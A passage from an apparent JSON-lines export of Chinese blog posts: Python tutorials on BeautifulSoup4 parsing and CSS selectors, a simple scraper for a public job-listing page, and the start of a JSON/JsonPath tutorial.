SAPI：</p>\n\n<ul><li>\n\t<p>aolserver</p>\n\t</li>\n\t<li>\n\t<p>apache</p>\n\t</li>\n\t<li>\n\t<p>apache_hooks</p>\n\t</li>\n\t<li>\n\t<p>apache2filter</p>\n\t</li>\n\t<li>\n\t<p>caudium</p>\n\t</li>\n\t<li>\n\t<p>continuity</p>\n\t</li>\n\t<li>\n\t<p>isapi</p>\n\t</li>\n\t<li>\n\t<p>milter</p>\n\t</li>\n\t<li>\n\t<p>nsapi</p>\n\t</li>\n\t<li>\n\t<p>phttpd</p>\n\t</li>\n\t<li>\n\t<p>pi3web</p>\n\t</li>\n\t<li>\n\t<p>roxen</p>\n\t</li>\n\t<li>\n\t<p>thttpd</p>\n\t</li>\n\t<li>\n\t<p>tux</p>\n\t</li>\n\t<li>\n\t<p>webjames</p>\n\t</li>\n</ul>                                    </div>", "log_PostTime": 1584891210, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "CSS 选择器：BeautifulSoup4解析器", "log_Intro": "CSS 选择器：BeautifulSoup4解析器", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p>和 lxml 一样，Beautiful Soup 也是一个HTML/XML的解析器，主要的功能也是如何解析和提取 HTML/XML 数据。</p>\n\n<blockquote>\n<p>lxml 只会局部遍历，而Beautiful Soup 是基于HTML DOM的，会载入整个文档，解析整个DOM树，因此时间和内存开销都会大很多，所以性能要低于lxml。</p>\n\n<p>BeautifulSoup 用来解析 HTML 比较简单，API非常人性化，支持<a href=\"http://www.w3school.com.cn/cssref/css_selectors.asp\" rel=\"nofollow\">CSS选择器</a>、Python标准库中的HTML解析器，也支持 lxml 的 XML解析器。</p>\n\n<p>Beautiful Soup 3 目前已经停止开发，推荐现在的项目使用Beautiful Soup 4。使用 pip 安装即可：<code>pip install beautifulsoup4</code></p>\n\n<p>官方文档：<a href=\"http://beautifulsoup.readthedocs.io/zh_CN/v4.4.0/\" rel=\"nofollow\">http://beautifulsoup.readthedocs.io/zh_CN/v4.4.0</a></p>\n</blockquote>\n\n<table><thead><tr><th>抓取工具</th>\n\t\t\t<th>速度</th>\n\t\t\t<th>使用难度</th>\n\t\t\t<th>安装难度</th>\n\t\t</tr></thead><tbody><tr><td>正则</td>\n\t\t\t<td>最快</td>\n\t\t\t<td>困难</td>\n\t\t\t<td>无（内置）</td>\n\t\t</tr><tr><td>BeautifulSoup</td>\n\t\t\t<td>慢</td>\n\t\t\t<td>最简单</td>\n\t\t\t<td>简单</td>\n\t\t</tr><tr><td>lxml</td>\n\t\t\t<td>快</td>\n\t\t\t<td>简单</td>\n\t\t\t<td>一般</td>\n\t\t</tr></tbody></table><hr><h2 id=\"示例：\">示例：</h2>\n\n<p>首先必须要导入 bs4 库</p>\n\n<pre class=\"has\">\n<code># beautifulsoup4_test.py\n\nfrom bs4 import BeautifulSoup\n\nhtml = \"\"\"\n&lt;html&gt;&lt;head&gt;&lt;title&gt;The Dormouse's story&lt;/title&gt;&lt;/head&gt;\n&lt;body&gt;\n&lt;p class=\"title\" name=\"dromouse\"&gt;&lt;b&gt;The Dormouse's story&lt;/b&gt;&lt;/p&gt;\n&lt;p class=\"story\"&gt;Once upon a time there were three little sisters; and their names were\n&lt;a href=\"http://example.com/elsie\" class=\"sister\" id=\"link1\"&gt;&lt;!-- Elsie --&gt;&lt;/a&gt;,\n&lt;a href=\"http://example.com/lacie\" class=\"sister\" id=\"link2\"&gt;Lacie&lt;/a&gt; and\n&lt;a href=\"http://example.com/tillie\" class=\"sister\" id=\"link3\"&gt;Tillie&lt;/a&gt;;\nand they lived at the bottom of a well.&lt;/p&gt;\n&lt;p class=\"story\"&gt;...&lt;/p&gt;\n\"\"\"\n\n#创建 Beautiful Soup 对象\nsoup = BeautifulSoup(html)\n\n#打开本地 HTML 文件的方式来创建对象\n#soup = BeautifulSoup(open('index.html'))\n\n#格式化输出 soup 对象的内容\nprint soup.prettify()\n</code></pre>\n\n<p>运行结果：</p>\n\n<pre class=\"has\">\n<code>&lt;html&gt;\n &lt;head&gt;\n  &lt;title&gt;\n   The Dormouse's story\n  &lt;/title&gt;\n &lt;/head&gt;\n &lt;body&gt;\n  &lt;p class=\"title\" name=\"dromouse\"&gt;\n   &lt;b&gt;\n    The Dormouse's story\n   &lt;/b&gt;\n  &lt;/p&gt;\n  &lt;p class=\"story\"&gt;\n   Once upon a time there were three little sisters; and their names were\n   &lt;a class=\"sister\" href=\"http://example.com/elsie\" id=\"link1\"&gt;\n    &lt;!-- Elsie --&gt;\n   &lt;/a&gt;\n   ,\n   &lt;a class=\"sister\" href=\"http://example.com/lacie\" id=\"link2\"&gt;\n    Lacie\n   &lt;/a&gt;\n   and\n   &lt;a class=\"sister\" href=\"http://example.com/tillie\" id=\"link3\"&gt;\n    Tillie\n   &lt;/a&gt;\n   ;\nand they lived at the bottom of a well.\n  &lt;/p&gt;\n  &lt;p class=\"story\"&gt;\n   ...\n  &lt;/p&gt;\n &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n\n<blockquote>\n<ul><li>\n\t<p>如果我们在 IPython2 下执行，会看到这样一段警告： </p>\n\t</li>\n</ul><p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20191029154637742.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"></p>\n\n<ul><li>\n\t<p>意思是，如果我们没有显式地指定解析器，所以默认使用这个系统的最佳可用HTML解析器(“lxml”)。如果你在另一个系统中运行这段代码，或者在不同的虚拟环境中，使用不同的解析器造成行为不同。</p>\n\t</li>\n\t<li>但是我们可以通过<code>soup = BeautifulSoup(html,“lxml”)</code>方式指定lxml解析器。</li>\n</ul></blockquote>\n\n<h2 id=\"四大对象种类\">四大对象种类</h2>\n\n<p>Beautiful Soup将复杂HTML文档转换成一个复杂的树形结构,每个节点都是Python对象,所有对象可以归纳为4种:</p>\n\n<ul><li>Tag</li>\n\t<li>NavigableString</li>\n\t<li>BeautifulSoup</li>\n\t<li>Comment</li>\n</ul><h3 id=\"1-tag\">1. Tag</h3>\n\n<p>Tag 通俗点讲就是 HTML 中的一个个标签，例如：</p>\n\n<pre class=\"has\">\n<code>&lt;head&gt;&lt;title&gt;The Dormouse's story&lt;/title&gt;&lt;/head&gt;\n&lt;a class=\"sister\" href=\"http://example.com/elsie\" id=\"link1\"&gt;&lt;!-- Elsie --&gt;&lt;/a&gt;\n&lt;p class=\"title\" name=\"dromouse\"&gt;&lt;b&gt;The Dormouse's story&lt;/b&gt;&lt;/p&gt;\n</code></pre>\n\n<p>上面的 <code>title</code> <code>head</code> <code>a</code> <code>p</code>等等 HTML 标签加上里面包括的内容就是 Tag，那么试着使用 Beautiful Soup 来获取 Tags:</p>\n\n<pre class=\"has\">\n<code>from bs4 import BeautifulSoup\n\nhtml = \"\"\"\n&lt;html&gt;&lt;head&gt;&lt;title&gt;The Dormouse's story&lt;/title&gt;&lt;/head&gt;\n&lt;body&gt;\n&lt;p class=\"title\" name=\"dromouse\"&gt;&lt;b&gt;The Dormouse's story&lt;/b&gt;&lt;/p&gt;\n&lt;p class=\"story\"&gt;Once upon a time there were three little sisters; and their names were\n&lt;a href=\"http://example.com/elsie\" class=\"sister\" id=\"link1\"&gt;&lt;!-- Elsie --&gt;&lt;/a&gt;,\n&lt;a href=\"http://example.com/lacie\" class=\"sister\" id=\"link2\"&gt;Lacie&lt;/a&gt; and\n&lt;a href=\"http://example.com/tillie\" class=\"sister\" id=\"link3\"&gt;Tillie&lt;/a&gt;;\nand they lived at the bottom of a well.&lt;/p&gt;\n&lt;p class=\"story\"&gt;...&lt;/p&gt;\n\"\"\"\n\n#创建 Beautiful Soup 对象\nsoup = BeautifulSoup(html)\n\n\nprint soup.title\n# &lt;title&gt;The Dormouse's story&lt;/title&gt;\n\nprint soup.head\n# &lt;head&gt;&lt;title&gt;The Dormouse's story&lt;/title&gt;&lt;/head&gt;\n\nprint soup.a\n# &lt;a class=\"sister\" href=\"http://example.com/elsie\" id=\"link1\"&gt;&lt;!-- Elsie --&gt;&lt;/a&gt;\n\nprint soup.p\n# &lt;p class=\"title\" name=\"dromouse\"&gt;&lt;b&gt;The Dormouse's story&lt;/b&gt;&lt;/p&gt;\n\nprint type(soup.p)\n# &lt;class 'bs4.element.Tag'&gt;\n</code></pre>\n\n<p>我们可以利用 soup 加标签名轻松地获取这些标签的内容，这些对象的类型是<code>bs4.element.Tag</code>。但是注意，它查找的是在所有内容中的第一个符合要求的标签。如果要查询所有的标签，后面会进行介绍。</p>\n\n<p>对于 Tag，它有两个重要的属性，是 name 和 attrs</p>\n\n<pre class=\"has\">\n<code>print soup.name\n# [document] #soup 对象本身比较特殊，它的 name 即为 [document]\n\nprint soup.head.name\n# head #对于其他内部标签，输出的值便为标签本身的名称\n\nprint soup.p.attrs\n# {'class': ['title'], 'name': 'dromouse'}\n# 在这里，我们把 p 标签的所有属性打印输出了出来，得到的类型是一个字典。\n\nprint soup.p['class'] # soup.p.get('class')\n# ['title'] #还可以利用get方法，传入属性的名称，二者是等价的\n\nsoup.p['class'] = \"newClass\"\nprint soup.p # 可以对这些属性和内容等等进行修改\n# &lt;p class=\"newClass\" name=\"dromouse\"&gt;&lt;b&gt;The Dormouse's story&lt;/b&gt;&lt;/p&gt;\n\ndel soup.p['class'] # 还可以对这个属性进行删除\nprint soup.p\n# &lt;p name=\"dromouse\"&gt;&lt;b&gt;The Dormouse's story&lt;/b&gt;&lt;/p&gt;\n</code></pre>\n\n<h3 id=\"2-navigablestring\">2. NavigableString</h3>\n\n<p>既然我们已经得到了标签的内容，那么问题来了，我们要想获取标签内部的文字怎么办呢？很简单，用 .string 即可，例如</p>\n\n<pre class=\"has\">\n<code>print soup.p.string\n# The Dormouse's story\n\nprint type(soup.p.string)\n# In [13]: &lt;class 'bs4.element.NavigableString'&gt;\n</code></pre>\n\n<h3 id=\"3-beautifulsoup\">3. BeautifulSoup</h3>\n\n<p>BeautifulSoup 对象表示的是一个文档的内容。大部分时候,可以把它当作 Tag 对象，是一个特殊的 Tag，我们可以分别获取它的类型，名称，以及属性来感受一下</p>\n\n<pre class=\"has\">\n<code>print type(soup.name)\n# &lt;type 'unicode'&gt;\n\nprint soup.name \n# [document]\n\nprint soup.attrs # 文档本身的属性为空\n# {}\n</code></pre>\n\n<h3 id=\"4-comment\">4. Comment</h3>\n\n<p>Comment 对象是一个特殊类型的 NavigableString 对象，其输出的内容不包括注释符号。</p>\n\n<pre class=\"has\">\n<code>print soup.a\n# &lt;a class=\"sister\" href=\"http://example.com/elsie\" id=\"link1\"&gt;&lt;!-- Elsie --&gt;&lt;/a&gt;\n\nprint soup.a.string\n# Elsie \n\nprint type(soup.a.string)\n# &lt;class 'bs4.element.Comment'&gt;\n</code></pre>\n\n<p>a 标签里的内容实际上是注释，但是如果我们利用 .string 来输出它的内容时，注释符号已经去掉了。</p>\n\n<h2 id=\"遍历文档树\">遍历文档树</h2>\n\n<h3 id=\"1-直接子节点-：contents-children--属性\">1. 直接子节点 ：<code>.contents</code> <code>.children</code> 属性</h3>\n\n<p>.content</p>\n\n<p>tag 的 .content 属性可以将tag的子节点以列表的方式输出</p>\n\n<pre class=\"has\">\n<code>print soup.head.contents \n#[&lt;title&gt;The Dormouse's story&lt;/title&gt;]\n</code></pre>\n\n<p>输出方式为列表，我们可以用列表索引来获取它的某一个元素</p>\n\n<pre class=\"has\">\n<code>print soup.head.contents[0]\n#&lt;title&gt;The Dormouse's story&lt;/title&gt;\n</code></pre>\n\n<p>.children</p>\n\n<p>它返回的不是一个 list，不过我们可以通过遍历获取所有子节点。</p>\n\n<p>我们打印输出 .children 看一下，可以发现它是一个 list 生成器对象</p>\n\n<pre class=\"has\">\n<code>print soup.head.children\n#&lt;listiterator object at 0x7f71457f5710&gt;\n\nfor child in  soup.body.children:\n    print child\n</code></pre>\n\n<p>结果:</p>\n\n<pre class=\"has\">\n<code>&lt;p class=\"title\" name=\"dromouse\"&gt;&lt;b&gt;The Dormouse's story&lt;/b&gt;&lt;/p&gt;\n\n&lt;p class=\"story\"&gt;Once upon a time there were three little sisters; and their names were\n&lt;a class=\"sister\" href=\"http://example.com/elsie\" id=\"link1\"&gt;&lt;!-- Elsie --&gt;&lt;/a&gt;,\n&lt;a class=\"sister\" href=\"http://example.com/lacie\" id=\"link2\"&gt;Lacie&lt;/a&gt; and\n&lt;a class=\"sister\" href=\"http://example.com/tillie\" id=\"link3\"&gt;Tillie&lt;/a&gt;;\nand they lived at the bottom of a well.&lt;/p&gt;\n\n&lt;p class=\"story\"&gt;...&lt;/p&gt;\n</code></pre>\n\n<h3 id=\"2-所有子孙节点-descendants--属性\">2. 所有子孙节点: <code>.descendants</code> 属性</h3>\n\n<p>.contents 和 .children 属性仅包含tag的直接子节点，.descendants 属性可以对所有tag的子孙节点进行递归循环，和 children类似，我们也需要遍历获取其中的内容。</p>\n\n<pre class=\"has\">\n<code>for child in soup.descendants:\n    print child\n</code></pre>\n\n<p>运行结果：</p>\n\n<pre class=\"has\">\n<code>&lt;html&gt;&lt;head&gt;&lt;title&gt;The Dormouse's story&lt;/title&gt;&lt;/head&gt;\n&lt;body&gt;\n&lt;p class=\"title\" name=\"dromouse\"&gt;&lt;b&gt;The Dormouse's story&lt;/b&gt;&lt;/p&gt;\n&lt;p class=\"story\"&gt;Once upon a time there were three little sisters; and their names were\n&lt;a class=\"sister\" href=\"http://example.com/elsie\" id=\"link1\"&gt;&lt;!-- Elsie --&gt;&lt;/a&gt;,\n&lt;a class=\"sister\" href=\"http://example.com/lacie\" id=\"link2\"&gt;Lacie&lt;/a&gt; and\n&lt;a class=\"sister\" href=\"http://example.com/tillie\" id=\"link3\"&gt;Tillie&lt;/a&gt;;\nand they lived at the bottom of a well.&lt;/p&gt;\n&lt;p class=\"story\"&gt;...&lt;/p&gt;\n&lt;/body&gt;&lt;/html&gt;\n&lt;head&gt;&lt;title&gt;The Dormouse's story&lt;/title&gt;&lt;/head&gt;\n&lt;title&gt;The Dormouse's story&lt;/title&gt;\nThe Dormouse's story\n\n\n&lt;body&gt;\n&lt;p class=\"title\" name=\"dromouse\"&gt;&lt;b&gt;The Dormouse's story&lt;/b&gt;&lt;/p&gt;\n&lt;p class=\"story\"&gt;Once upon a time there were three little sisters; and their names were\n&lt;a class=\"sister\" href=\"http://example.com/elsie\" id=\"link1\"&gt;&lt;!-- Elsie --&gt;&lt;/a&gt;,\n&lt;a class=\"sister\" href=\"http://example.com/lacie\" id=\"link2\"&gt;Lacie&lt;/a&gt; and\n&lt;a class=\"sister\" href=\"http://example.com/tillie\" id=\"link3\"&gt;Tillie&lt;/a&gt;;\nand they lived at the bottom of a well.&lt;/p&gt;\n&lt;p class=\"story\"&gt;...&lt;/p&gt;\n&lt;/body&gt;\n\n\n&lt;p class=\"title\" name=\"dromouse\"&gt;&lt;b&gt;The Dormouse's story&lt;/b&gt;&lt;/p&gt;\n&lt;b&gt;The Dormouse's story&lt;/b&gt;\nThe Dormouse's story\n\n\n&lt;p class=\"story\"&gt;Once upon a time there were three little sisters; and their names were\n&lt;a class=\"sister\" href=\"http://example.com/elsie\" id=\"link1\"&gt;&lt;!-- Elsie --&gt;&lt;/a&gt;,\n&lt;a class=\"sister\" href=\"http://example.com/lacie\" id=\"link2\"&gt;Lacie&lt;/a&gt; and\n&lt;a class=\"sister\" href=\"http://example.com/tillie\" id=\"link3\"&gt;Tillie&lt;/a&gt;;\nand they lived at the bottom of a well.&lt;/p&gt;\nOnce upon a time there were three little sisters; and their names were\n\n&lt;a class=\"sister\" href=\"http://example.com/elsie\" id=\"link1\"&gt;&lt;!-- Elsie --&gt;&lt;/a&gt;\n Elsie \n,\n\n&lt;a class=\"sister\" href=\"http://example.com/lacie\" id=\"link2\"&gt;Lacie&lt;/a&gt;\nLacie\n and\n\n&lt;a class=\"sister\" href=\"http://example.com/tillie\" id=\"link3\"&gt;Tillie&lt;/a&gt;\nTillie\n;\nand they lived at the bottom of a well.\n\n\n&lt;p class=\"story\"&gt;...&lt;/p&gt;\n...\n</code></pre>\n\n<h3 id=\"3-节点内容-string-属性\">3. 节点内容: <code>.string</code> 属性</h3>\n\n<p>如果tag只有一个 NavigableString 类型子节点,那么这个tag可以使用 .string 得到子节点。如果一个tag仅有一个子节点,那么这个tag也可以使用 .string 方法,输出结果与当前唯一子节点的 .string 结果相同。</p>\n\n<p>通俗点说就是：如果一个标签里面没有标签了，那么 .string 就会返回标签里面的内容。如果标签里面只有唯一的一个标签了，那么 .string 也会返回最里面的内容。例如：</p>\n\n<pre class=\"has\">\n<code>print soup.head.string\n#The Dormouse's story\nprint soup.title.string\n#The Dormouse's story\n</code></pre>\n\n<h2 id=\"搜索文档树\">搜索文档树</h2>\n\n<h3 id=\"1findallname-attrs-recursive-text-kwargs\">1.<code>find_all(name, attrs, recursive, text, **kwargs)</code></h3>\n\n<p>1）name 参数</p>\n\n<p>name 参数可以查找所有名字为 name 的tag,字符串对象会被自动忽略掉</p>\n\n<p>A.传字符串</p>\n\n<p>最简单的过滤器是字符串.在搜索方法中传入一个字符串参数,Beautiful Soup会查找与字符串完整匹配的内容,下面的例子用于查找文档中所有的<code>&lt;b&gt;</code>标签:</p>\n\n<pre class=\"has\">\n<code>soup.find_all('b')\n# [&lt;b&gt;The Dormouse's story&lt;/b&gt;]\n\nprint soup.find_all('a')\n#[&lt;a class=\"sister\" href=\"http://example.com/elsie\" id=\"link1\"&gt;&lt;!-- Elsie --&gt;&lt;/a&gt;, &lt;a class=\"sister\" href=\"http://example.com/lacie\" id=\"link2\"&gt;Lacie&lt;/a&gt;, &lt;a class=\"sister\" href=\"http://example.com/tillie\" id=\"link3\"&gt;Tillie&lt;/a&gt;]\n</code></pre>\n\n<p>B.传正则表达式</p>\n\n<p>如果传入正则表达式作为参数,Beautiful Soup会通过正则表达式的 match() 来匹配内容.下面例子中找出所有以b开头的标签,这表示<code>&lt;body&gt;</code>和<code>&lt;b&gt;</code>标签都应该被找到</p>\n\n<pre class=\"has\">\n<code>import re\nfor tag in soup.find_all(re.compile(\"^b\")):\n    print(tag.name)\n# body\n# b\n</code></pre>\n\n<p>C.传列表</p>\n\n<p>如果传入列表参数,Beautiful Soup会将与列表中任一元素匹配的内容返回.下面代码找到文档中所有<code>&lt;a&gt;</code>标签和<code>&lt;b&gt;</code>标签:</p>\n\n<pre class=\"has\">\n<code>soup.find_all([\"a\", \"b\"])\n# [&lt;b&gt;The Dormouse's story&lt;/b&gt;,\n#  &lt;a class=\"sister\" href=\"http://example.com/elsie\" id=\"link1\"&gt;Elsie&lt;/a&gt;,\n#  &lt;a class=\"sister\" href=\"http://example.com/lacie\" id=\"link2\"&gt;Lacie&lt;/a&gt;,\n#  &lt;a class=\"sister\" href=\"http://example.com/tillie\" id=\"link3\"&gt;Tillie&lt;/a&gt;]\n</code></pre>\n\n<p>2）keyword 参数</p>\n\n<pre class=\"has\">\n<code>soup.find_all(id='link2')\n# [&lt;a class=\"sister\" href=\"http://example.com/lacie\" id=\"link2\"&gt;Lacie&lt;/a&gt;]\n</code></pre>\n\n<p>3）text 参数</p>\n\n<p>通过 text 参数可以搜搜文档中的字符串内容，与 name 参数的可选值一样, text 参数接受 字符串 , 正则表达式 , 列表</p>\n\n<pre class=\"has\">\n<code>soup.find_all(text=\"Elsie\")\n# [u'Elsie']\n\nsoup.find_all(text=[\"Tillie\", \"Elsie\", \"Lacie\"])\n# [u'Elsie', u'Lacie', u'Tillie']\n\nsoup.find_all(text=re.compile(\"Dormouse\"))\n[u\"The Dormouse's story\", u\"The Dormouse's story\"]\n</code></pre>\n\n<h2 id=\"css选择器\">CSS选择器</h2>\n\n<p>这就是另一种与 find_all 方法有异曲同工之妙的查找方法.</p>\n\n<ul><li>\n\t<p>写 CSS 时，标签名不加任何修饰，类名前加<code>.</code>，id名前加<code>#</code></p>\n\t</li>\n\t<li>\n\t<p>在这里我们也可以利用类似的方法来筛选元素，用到的方法是 <code>soup.select()</code>，返回类型是 <code>list</code></p>\n\t</li>\n</ul><h3 id=\"（1）通过标签名查找\">（1）通过标签名查找</h3>\n\n<pre class=\"has\">\n<code>print soup.select('title') \n#[&lt;title&gt;The Dormouse's story&lt;/title&gt;]\n\nprint soup.select('a')\n#[&lt;a class=\"sister\" href=\"http://example.com/elsie\" id=\"link1\"&gt;&lt;!-- Elsie --&gt;&lt;/a&gt;, &lt;a class=\"sister\" href=\"http://example.com/lacie\" id=\"link2\"&gt;Lacie&lt;/a&gt;, &lt;a class=\"sister\" href=\"http://example.com/tillie\" id=\"link3\"&gt;Tillie&lt;/a&gt;]\n\nprint soup.select('b')\n#[&lt;b&gt;The Dormouse's story&lt;/b&gt;]\n</code></pre>\n\n<h3 id=\"（2）通过类名查找\">（2）通过类名查找</h3>\n\n<pre class=\"has\">\n<code>print soup.select('.sister')\n#[&lt;a class=\"sister\" href=\"http://example.com/elsie\" id=\"link1\"&gt;&lt;!-- Elsie --&gt;&lt;/a&gt;, &lt;a class=\"sister\" href=\"http://example.com/lacie\" id=\"link2\"&gt;Lacie&lt;/a&gt;, &lt;a class=\"sister\" href=\"http://example.com/tillie\" id=\"link3\"&gt;Tillie&lt;/a&gt;]\n</code></pre>\n\n<h3 id=\"（3）通过-id-名查找\">（3）通过 id 名查找</h3>\n\n<pre class=\"has\">\n<code>print soup.select('#link1')\n#[&lt;a class=\"sister\" href=\"http://example.com/elsie\" id=\"link1\"&gt;&lt;!-- Elsie --&gt;&lt;/a&gt;]\n</code></pre>\n\n<h3 id=\"（4）组合查找\">（4）组合查找</h3>\n\n<p>组合查找即和写 class 文件时，标签名与类名、id名进行的组合原理是一样的，例如查找 p 标签中，id 等于 link1的内容，二者需要用空格分开</p>\n\n<pre class=\"has\">\n<code>print soup.select('p #link1')\n#[&lt;a class=\"sister\" href=\"http://example.com/elsie\" id=\"link1\"&gt;&lt;!-- Elsie --&gt;&lt;/a&gt;]\n</code></pre>\n\n<p>直接子标签查找，则使用 <code>&gt;</code> 分隔</p>\n\n<pre class=\"has\">\n<code>print soup.select(\"head &gt; title\")\n#[&lt;title&gt;The Dormouse's story&lt;/title&gt;]\n</code></pre>\n\n<h3 id=\"（5）属性查找\">（5）属性查找</h3>\n\n<p>查找时还可以加入属性元素，属性需要用中括号括起来，注意属性和标签属于同一节点，所以中间不能加空格，否则会无法匹配到。</p>\n\n<pre class=\"has\">\n<code>print soup.select('a[class=\"sister\"]')\n#[&lt;a class=\"sister\" href=\"http://example.com/elsie\" id=\"link1\"&gt;&lt;!-- Elsie --&gt;&lt;/a&gt;, &lt;a class=\"sister\" href=\"http://example.com/lacie\" id=\"link2\"&gt;Lacie&lt;/a&gt;, &lt;a class=\"sister\" href=\"http://example.com/tillie\" id=\"link3\"&gt;Tillie&lt;/a&gt;]\n\nprint soup.select('a[href=\"http://example.com/elsie\"]')\n#[&lt;a class=\"sister\" href=\"http://example.com/elsie\" id=\"link1\"&gt;&lt;!-- Elsie --&gt;&lt;/a&gt;]\n</code></pre>\n\n<p>同样，属性仍然可以与上述查找方式组合，不在同一节点的空格隔开，同一节点的不加空格</p>\n\n<pre class=\"has\">\n<code>print soup.select('p a[href=\"http://example.com/elsie\"]')\n#[&lt;a class=\"sister\" href=\"http://example.com/elsie\" id=\"link1\"&gt;&lt;!-- Elsie --&gt;&lt;/a&gt;]\n</code></pre>\n\n<h3 id=\"6-获取内容\">(6) 获取内容</h3>\n\n<p>以上的 select 方法返回的结果都是列表形式，可以遍历形式输出，然后用 get_text() 方法来获取它的内容。</p>\n\n<pre class=\"has\">\n<code>soup = BeautifulSoup(html, 'lxml')\nprint type(soup.select('title'))\nprint soup.select('title')[0].get_text()\n\nfor title in soup.select('title'):\n    print title.get_text()</code></pre>\n                                    </div>", "log_PostTime": 1584891212, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Python案例：使用BeautifuSoup4的爬虫", "log_Intro": "Python案例：使用BeautifuSoup4的爬虫", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p>我们以腾讯社招页面来做演示：<a href=\"http://hr.tencent.com/position.php?&amp;start=10#a\" rel=\"nofollow\">http://hr.tencent.com/position.php?&amp;start=10#a</a></p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20191029155732701.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"></p>\n\n<p> </p>\n\n<p>使用BeautifuSoup4解析器，将招聘网页上的职位名称、职位类别、招聘人数、工作地点、发布时间，以及每个职位详情的点击链接存储出来。</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/2019102915575324.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"></p>\n\n<p> </p>\n\n<pre class=\"has\">\n<code class=\"language-python\"># bs4_tencent.py\n\n\nfrom bs4 import BeautifulSoup\nimport urllib2\nimport urllib\nimport json    # 使用了json格式存储\n\ndef tencent():\n    url = 'http://hr.tencent.com/'\n    request = urllib2.Request(url + 'position.php?&amp;start=10#a')\n    response =urllib2.urlopen(request)\n    resHtml = response.read()\n\n    output =open('tencent.json','w')\n\n    html = BeautifulSoup(resHtml,'lxml')\n\n# 创建CSS选择器\n    result = html.select('tr[class=\"even\"]')\n    result2 = html.select('tr[class=\"odd\"]')\n    result += result2\n\n    items = []\n    for site in result:\n        item = {}\n\n        name = site.select('td a')[0].get_text()\n        detailLink = site.select('td a')[0].attrs['href']\n        catalog = site.select('td')[1].get_text()\n        recruitNumber = site.select('td')[2].get_text()\n        workLocation = site.select('td')[3].get_text()\n        publishTime = site.select('td')[4].get_text()\n\n        item['name'] = name\n        item['detailLink'] = url + detailLink\n        item['catalog'] = catalog\n        item['recruitNumber'] = recruitNumber\n        item['publishTime'] = publishTime\n\n        items.append(item)\n\n    # 禁用ascii编码，按utf-8编码\n    line = json.dumps(items,ensure_ascii=False)\n\n    output.write(line.encode('utf-8'))\n    output.close()\n\nif __name__ == \"__main__\":\n   tencent()</code></pre>\n                                    </div>", "log_PostTime": 1584891213, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Python:数据提取之JSON与JsonPATH", "log_Intro": "Python:数据提取之JSON与JsonPATH", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p>JSON(JavaScript Object Notation) 是一种轻量级的数据交换格式，它使得人们很容易的进行阅读和编写。同时也方便了机器进行解析和生成。适用于进行数据交互的场景，比如网站前台与后台之间的数据交互。</p>\n\n<p>JSON和XML的比较可谓不相上下。</p>\n\n<p>Python 2.7中自带了JSON模块，直接<code>import json</code>就可以使用了。</p>\n\n<p>官方文档：<a href=\"http://docs.python.org/library/json.html\" rel=\"nofollow\">http://docs.python.org/library/json.html</a></p>\n\n<p>Json在线解析网站：<a href=\"http://www.json.cn/#\" rel=\"nofollow\">http://www.json.cn/#</a></p>\n\n<h1 id=\"json\">JSON</h1>\n\n<p>json简单说就是javascript中的对象和数组，所以这两种结构就是对象和数组两种结构，通过这两种结构可以表示各种复杂的结构</p>\n\n<blockquote>\n<ol><li>\n\t<p>对象：对象在js中表示为<code>{ }</code>括起来的内容，数据结构为 <code>{ key：value, key：value, ... }</code>的键值对的结构，在面向对象的语言中，key为对象的属性，value为对应的属性值，所以很容易理解，取值方法为 对象.key 获取属性值，这个属性值的类型可以是数字、字符串、数组、对象这几种。</p>\n\t</li>\n\t<li>\n\t<p>数组：数组在js中是中括号<code>[ ]</code>括起来的内容，数据结构为 <code>[\"Python\", \"javascript\", \"C++\", ...]</code>，取值方式和所有语言中一样，使用索引获取，字段值的类型可以是 数字、字符串、数组、对象几种。</p>\n\t</li>\n</ol></blockquote>\n\n<h1 id=\"import-json\">import json</h1>\n\n<p>json模块提供了四个功能：<code>dumps</code>、<code>dump</code>、<code>loads</code>、<code>load</code>，用于字符串 和 python数据类型间进行转换。</p>\n\n<h2 id=\"1-jsonloads\">1. json.loads()</h2>\n\n<p>把Json格式字符串解码转换成Python对象 从json到python的类型转化对照如下：</p>\n\n<p> </p>\n\n<p><img alt=\"\" class=\"has\" height=\"213\" src=\"https://img-blog.csdnimg.cn/20191029173815202.png\" width=\"244\"></p>\n\n<pre class=\"has\">\n<code># json_loads.py\n\nimport json\n\nstrList = '[1, 2, 3, 4]'\n\nstrDict = '{\"city\": \"北京\", \"name\": \"大猫\"}'\n\njson.loads(strList) \n# [1, 2, 3, 4]\n\njson.loads(strDict) # json数据自动按Unicode存储\n# {u'city': u'\\u5317\\u4eac', u'name': u'\\u5927\\u732b'}\n</code></pre>\n\n<h2 id=\"2-jsondumps\">2. json.dumps()</h2>\n\n<p>实现python类型转化为json字符串，返回一个str对象 把一个Python对象编码转换成Json字符串</p>\n\n<p>从python原始类型向json类型的转化对照如下：</p>\n\n<p><img alt=\"\" class=\"has\" height=\"200\" src=\"https://img-blog.csdnimg.cn/20191029173830527.png\" width=\"244\"></p>\n\n<p> </p>\n\n<pre class=\"has\">\n<code># json_dumps.py\n\nimport json\nimport chardet\n\nlistStr = [1, 2, 3, 4]\ntupleStr = (1, 2, 3, 4)\ndictStr = {\"city\": \"北京\", \"name\": \"大猫\"}\n\njson.dumps(listStr)\n# '[1, 2, 3, 4]'\njson.dumps(tupleStr)\n# '[1, 2, 3, 